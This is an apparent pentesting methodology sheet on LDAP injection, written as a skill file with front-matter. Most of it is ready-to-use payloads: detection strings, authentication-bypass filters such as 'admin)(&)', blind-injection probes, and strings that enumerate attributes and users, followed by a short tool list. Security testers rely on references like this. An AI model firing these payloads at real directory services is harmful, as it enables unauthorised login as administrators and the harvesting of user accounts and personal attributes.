---
name: ldap-injection
description: LDAP injection — filter bypass, blind injection, attribute extraction, wildcard attacks
category: vulnerabilities
---

# LDAP Injection Methodology

## What It Is
LDAP injection occurs when user input is embedded in LDAP search filters without sanitization, allowing filter manipulation.

## Detection Payloads
```
*)(uid=*))(|(uid=*
*)(|(cn=*))
*)(|(password=*))
*)(uid=*)
admin*)(uid=*
admin*)(|(uid=*
*/*
```

## Authentication Bypass
```ldap
// Normal filter:
(&(uid=admin)(password=pass123))

// Bypass payload in username:
admin)(&)
// Result: (&(uid=admin)(&))(password=anything)
// LDAP ignores second filter → authenticated as admin

// Another bypass:
*)(uid=*))(|(uid=*
// Result: (&(uid=*)(uid=*))(|(uid=*)(password=anything))
```

## Blind LDAP Injection
```
*)(uid=*))(|(uid=*             → valid, returns entries
*)(uid=*))(|(uid=test123      → no results
```

## Extracting LDAP Structure
```
// Check if specific attributes exist:
*)(cn=*))(|(cn=*
*)(sn=*))(|(sn=*
*)(mail=*))(|(mail=*
*)(telephoneNumber=*))(|(telephoneNumber=*

// Enumerate valid users:
admin*)(uid=*))(|(uid=*
admin*)(uid=a*))(|(uid=*
admin*)(uid=b*))(|(uid=*
```

## Tools
- `ldapsearch` — CLI LDAP query tool
- `LDAP Injection` Burp plugin
- `jXPLorer` — LDAP browser
